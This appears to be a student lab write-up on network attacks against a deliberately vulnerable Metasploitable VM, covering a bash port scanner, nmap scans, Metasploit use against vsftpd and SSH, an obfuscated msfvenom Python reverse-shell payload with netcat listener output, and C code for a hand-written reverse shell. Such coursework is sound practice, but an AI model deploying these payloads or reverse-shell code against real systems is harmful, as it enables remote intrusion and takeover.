# Lab 1: Network Security

This lab introduces some useful network exploit concepts and tools commonly used to get familiar with attack styles, as well as practice Linux commands from Lab 0 in the context. Also, this lab will give a better understanding about the underlying mechanisms of tools rather than just observing the outcomes of tools.

## 1.0. Vulnerable VM (Metasploitable)
This is a purposely vulnerable target machine for practicing pen testing techniques.  

## 1.1. Port Scan Using Bash
Creating a port scanner using a bash script.
```
#!/bin/bash
if [ $# -ne 1 ] //checks if user has supplied an argument 
then
    echo "Usage: `basename $0` {IP address or hostname}"
    exit 1
fi

# define a variable and set it to the value passed as the first argument ($1)
ip_address=$1 //stores ip address from user
# write the current date to the output file
echo `date` >> $ip_address.open_ports //writes current date to ip address file

# for loop, where “i” starts at 1 and each time increments up to 65535
for port in {1..65535} // scans every TCP port from 1 to 65535
do
    # use a short timeout, and write to the port on the IP address
    timeout 1 echo >/dev/tcp/$ip_address/$port //attempts to to connect to each port
    # if that succeeded (checks the return value stored in $?)
    if [ $? -eq 0 ] //checks if connection succeeded
    then
        # append results to a file named after the date and host
        echo "port $port is open" >> "$ip_address.open_ports" //records the open port
    fi
done
```
Outputs a file named 10.0.2.3.open_ports showing all open ports.  
This is essentially a very simple nmap to check open ports created through bash.  

## 1.2. Nmap  
In this section we virtually doing the same thing using a tool called nmap.  
nmap is an open-source network tool for network exploration and security auditing. It useful for network administration and also malicious purposes.  

nmap -sn [target ip range]  
- Scans potentially vulnerable points in an ip range.

nmap -sn 10.0.2.0/24  
- Shows that my vulnerable metasploit VM is up at 10.0.2.3

nmap -sV -O -T4 10.0.2.3
- Shows open ports on vulnerable machine (potential entry points for an attacker)
- -sV shows service and version running on open ports. For pen testing knowing versions can help identify vulnerabilities
- -O attempts to identify the target OS through TCP/IP stack finger printing
- -T4 is a timing template for faster scans

## 1.3 Metasploit
As we are using a vulnerable VM the nmap scan gives us plenty of vulnerabilities to exploit associated with services we found. In this section, we use Metasploit. Metasploit is a widely used, open-source penetration testing framework used to find, test, and validate vulnerabilities. The platform consists of key components like exploits, payloads, and auxiliary modules.  

### 1.3.1 FTP  
The first service we will exploit is FTP at port 21.  
Looking at vulnerabilities associated with version vsftpd 2.3.4, there is a severe backdoor vulnerability (CVE-2011-2523).  
Using the metasploit framework we must the RHOST to the target IP (10.0.2.3) and RPORT to port 21, so that we target the FTP service at port 21 of the target VM.  

### 1.3.2. SSH  
Now, we target SSH a more commonly used service. We assume we do not know the target VMs credentials, so we must figure out a way to access the username and password.  
In metasploitable, we will run search ssh_login to find potential exploits. To exploit will perform a brute force attack (for times sake as we already know the uname and passwd, we can shorten the attack.  

### 1.3.3. Reverse Shell  
Here, we use Metasploit's msfvenom tool to create vulnerable executables.  
Process:  
- Generate payload (python executable)
- Place the payload on the target machine 
- Execute it on target
- The target will then connect to my attacker VM, giving a reverse shell on attacker VM. Can be confirmed by running whoami on attacker VM.  
Output:  
```
msf > msfvenom -p python/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443
[*] exec: msfvenom -p python/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443

Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 412 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNjsFqwzAQRM/SV+hmiTrCTh0oBR1CcCGUtqHxPTjShoi4ktDK7e9Xanzo8c08dtZ+BR8TQ69vkNiIDKldovkcoteAWOJI0SuUd4+j3L6c9u/9UKM8fuxeT8fhs9++iSxJ7Z0DnTiv2kY2ci3bTVV33aMQ9OdqJ2BDnOGZEqOyHEF/87ZZd4ISe2ETOG6EUk3uyTnCeKMkqCgPPpRGGtDeAK/mdFk9VaLGK0yTKgdrTMa6ou4PfQE/p38EMS6Uh7wK8m7k/dFw8fDH2VmYkvwagjPcC/oLXwBbOg==')[0])))
msf > nc -lvnp 443
[*] exec: nc -lvnp 443

listening on [any] 443 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.4] 49126
whoami
kali
```

### 1.3.4. Write our own Reverse Shell
The code in this section creates a reverse shell for the attacker on a target VM.
Code snippet from hacker.c  
```
printf("try executing any linux commands.\n");
	while(1) {
		FD_ZERO(&read_socket_ids);
		FD_SET( fileno(stdin), &read_socket_ids);
		FD_SET( cli_socket_id, &read_socket_ids);
		select( cli_socket_id+1, &read_socket_ids, 0, 0, 0);

		if (FD_ISSET( fileno(stdin), &read_socket_ids)) {
			bzero(snd_buffer, sizeof(snd_buffer));
			read( fileno(stdin), snd_buffer, sizeof(snd_buffer));

			if (strcmp(snd_buffer,"chdir\n")==0)
				strcpy(snd_buffer,"pwd\n");

			write( cli_socket_id, snd_buffer, sizeof(snd_buffer)); //prepares for command transmission
		}	

		if (FD_ISSET( cli_socket_id, &read_socket_ids)) {
			bzero(rcv_buffer, sizeof(rcv_buffer));
			if (read(cli_socket_id, rcv_buffer, sizeof(rcv_buffer)) <=0)
				exit_with_error(NULL);
			write( fileno(stdout), rcv_buffer, sizeof(rcv_buffer)); //sends the command
		}
	}

	return 0;
``` 
Code snippet from victim.c
```
printf("redirect stdin, stdout, and stderr to client socket.\n");
	printf("& replace current process with a command shell.\n");

	if (dup2(socket_id, 0) < 0) exit_with_error(NULL); //makes stdin -> TCP socket. Anything the program reads from stdin comes from the attacker
	if (dup2(socket_id, 1) < 0) exit_with_error(NULL); //makes stdout -> TCP socket. Anything printed by the screen is sent across the network.
	if (dup2(socket_id, 2) < 0) exit_with_error(NULL); //makes stderr -> TCP socket. Any error messages are sent to the attacker.

	if (execl("/bin/sh", "sh", (char*) NULL) < 0) exit_with_error(NULL); //executes shell
```
This code uses no obfuscation to help us understand the code/method involved in launching a reverse shell. Unlike Metasploit, which is more realistic for malicious purposes as it uses obfuscation to make detection more difficult.
